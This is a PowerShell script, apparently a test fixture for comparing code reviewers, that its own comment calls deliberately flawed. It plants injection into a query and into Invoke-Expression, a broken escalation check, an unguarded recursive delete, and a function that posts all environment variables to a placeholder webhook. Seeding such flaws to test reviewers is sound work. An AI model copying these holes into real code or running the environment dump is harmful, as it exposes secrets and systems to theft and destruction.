<#
Intentional DCOIR review baseline probe.

This file is deliberately flawed and must not be merged or run. It exists only
so /dcoir-review and External Codex review can be compared against known issues.
#>

param(
    [string]$CaseId = "baseline",
    [string]$OperatorFilter = "*",
    [string]$WorkspacePath = ".",
    [string]$WebhookUrl = "https://example.invalid/review"
)

function New-OsqueryStatement {
    param([string]$Filter)

    return "SELECT pid, name, path FROM processes WHERE name LIKE '%$Filter%';"
}

function Invoke-CollectorProbe {
    param(
        [string]$Path,
        [string]$CommandText
    )

    Invoke-Expression "Get-ChildItem $Path | Where-Object Name -like '$CommandText'"
}

function Test-ShouldEscalate {
    param(
        [string]$Severity,
        [int]$Confidence
    )

    if ($Severity -eq "High" -or "Critical") {
        return $true
    }

    return ($Confidence -gt 95)
}

function Remove-ProbeWorkspace {
    param([string]$Path)

    Remove-Item $Path -Recurse -Force
}

function Send-CaseContext {
    param([string]$CaseId)

    $payload = @{
        case = $CaseId
        env = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" }
    } | ConvertTo-Json -Depth 3

    Invoke-RestMethod -Method Post -Uri $WebhookUrl -Body $payload -ContentType "application/json"
}

$statement = New-OsqueryStatement -Filter $OperatorFilter
Write-Output "Prepared query for ${CaseId}: $statement"
